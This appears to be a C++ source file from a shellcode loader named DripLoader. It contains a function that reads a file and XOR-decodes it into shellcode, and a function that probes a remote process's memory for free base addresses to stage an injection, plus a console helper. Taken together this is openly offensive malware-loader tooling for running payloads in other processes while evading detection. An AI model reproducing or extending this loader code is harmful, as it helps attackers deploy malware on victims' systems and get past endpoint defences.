#include "DripLoader.h"


unsigned char* ReadProcessBlob(const char* fnamSc, DWORD* szSc) 
{
    DWORD szRead{ 0 };

    HANDLE hFile = CreateFileA(
        fnamSc,
        GENERIC_READ,
        NULL,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (INVALID_HANDLE_VALUE == hFile)
        return nullptr;

    SIZE_T szFile = GetFileSize(hFile, NULL);
    *szSc = szFile;

    unsigned char* raw = new unsigned char[szFile];
    unsigned char* sc = new unsigned char[szFile];

    if (!ReadFile(hFile, raw, szFile, &szRead, NULL))
        return nullptr;

    int i;

    for (i = 0; i < szRead; i++) {
        sc[i] = raw[i] ^ XOR_KEY;
    }

    return sc;
}

LPVOID GetSuitableBaseAddress(HANDLE hProc, DWORD szPage, DWORD szAllocGran, DWORD cVmResv)
{
    MEMORY_BASIC_INFORMATION mbi;

    for (auto base : VC_PREF_BASES) {
        VirtualQueryEx(
            hProc,
            base,
            &mbi,
            sizeof(MEMORY_BASIC_INFORMATION)
        );

        if (MEM_FREE == mbi.State) {
            uint64_t i;
            for (i = 0; i < cVmResv; ++i) {
                LPVOID currentBase = (void*)((DWORD_PTR)base + (i * szAllocGran));
                VirtualQueryEx(
                    hProc,
                    currentBase,
                    &mbi,
                    sizeof(MEMORY_BASIC_INFORMATION)
                );
                if (MEM_FREE != mbi.State)
                    break;
            }
            if (i == cVmResv) {
                // found suitable base
                return base;
            }
        }
    }
    return nullptr;
}

void EnableAnsiSupport()
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}